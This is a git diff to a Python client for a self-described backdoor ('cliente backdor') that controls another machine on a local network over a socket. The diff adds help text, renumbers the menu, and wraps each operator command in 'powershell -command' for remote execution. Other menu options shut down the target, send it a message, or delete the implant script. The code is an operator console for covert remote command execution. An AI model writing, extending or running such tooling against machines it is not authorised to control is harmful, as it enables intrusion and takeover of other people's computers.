@@ -7,17 +7,21 @@ from colorama import init
 
 init()
 
-args=argparse.ArgumentParser()
-args.add_argument('-P','--puerto',type=int)
-args.add_argument('-IP','--ip',type=str)
+args=argparse.ArgumentParser(description='pequeña utilidad para controlar remotamente una maquina dentro de la red via linea de comandos')
+args.add_argument('-P','--puerto',
+                  type=int,
+                  help='puerto donde escucha de la maquina a controlar (999 por defecto)')
+args.add_argument('-IP','--ip',
+                  type=str,
+                  help='direccion ipv4 privada de la maquina a controlar')
 arg = args.parse_args()
 
 
 # cliente backdor
-# Autor: Matias Urbaneja (Urban20)
-# https://github.com/Urban20
+# "Estamos hack" - Autor: Matias Urbaneja (Urb@n) - # https://github.com/Urban20
 
-n = 0
+
+n = 0 # valor que percibe la primera conexion
 timeout = 5
 
 if platform.system() == 'Linux':
@@ -29,11 +33,11 @@ elif platform.system() == 'Windows':
 def menu():
     print('''
 comandos basicos:
-          
+[\033[0;32m0\033[0m] borrar script          
 [\033[0;32m1\033[0m] apagar equipo
 [\033[0;32m2\033[0m] enviar mensaje
 [\033[0;32mq\033[0m] salir
-[\033[0;32mborrar\033[0m] borrar script
+
           ''')
 
 
@@ -44,7 +48,7 @@ def shell(socket):
     if entrada == 'q':
         print('\n\033[0;32m[*] saliendo\033[0m\n')
         exit(0)
-    elif entrada == 'borrar':
+    elif entrada == '0':
         os.system(borrar)
 
     elif entrada == '1':
@@ -58,8 +62,8 @@ def shell(socket):
     
 
     else:
-        socket.send(entrada.encode())
-        salida = socket.recv(1024).decode()
+        socket.send(f'powershell -command {entrada}'.encode()) # enviar comando de powershell por cmd
+        salida = socket.recv(1024).decode() # salida del comando (lo envia el bdor)
         if salida != None:
             print(salida)
         else:
